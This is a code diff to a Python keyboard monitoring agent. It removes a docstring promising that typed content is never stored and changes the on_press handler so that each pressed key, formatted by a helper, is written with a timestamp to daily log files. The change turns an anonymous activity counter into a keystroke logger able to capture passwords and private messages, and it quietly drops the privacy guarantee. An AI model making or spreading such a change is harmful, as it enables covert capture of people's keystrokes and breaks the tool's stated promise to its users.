@@ -21,6 +21,8 @@ from pathlib import Path
 
 from pynput import keyboard
 
+from utils import format_logged_key
+
 
 AGENT_NAME = "keyboard_agent"
 
@@ -130,6 +132,7 @@ def write_activity_event(
     keyboard_dir: str,
     logger: logging.Logger,
     write_lock: threading.Lock,
+    key:str,
 ) -> None:
     """
     Write one generic keyboard activity event.
@@ -141,9 +144,11 @@ def write_activity_event(
 
     log_file = get_daily_log_file(keyboard_dir)
 
+    # key1 = format_logged_key(key)
+
     entry = (
         f"{now.isoformat(timespec='seconds')} "
-        f"keyboard activity\n"
+        f"{key}\n"
     )
 
     try:
@@ -284,24 +289,14 @@ def main() -> None:
     # ------------------------------------------------------------------
 
     def on_press(_key) -> None:
-        """
-        Handle keyboard activity.
 
-        IMPORTANT:
-            _key is intentionally ignored.
-
-        We do NOT read:
-            key.char
-            key.name
-            str(key)
-
-        Therefore typed content is never stored.
-        """
+        key = format_logged_key(_key)
 
         write_activity_event(
             keyboard_dir=keyboard_dir,
             logger=logger,
             write_lock=write_lock,
+            key=key,
         )
 
     # ------------------------------------------------------------------
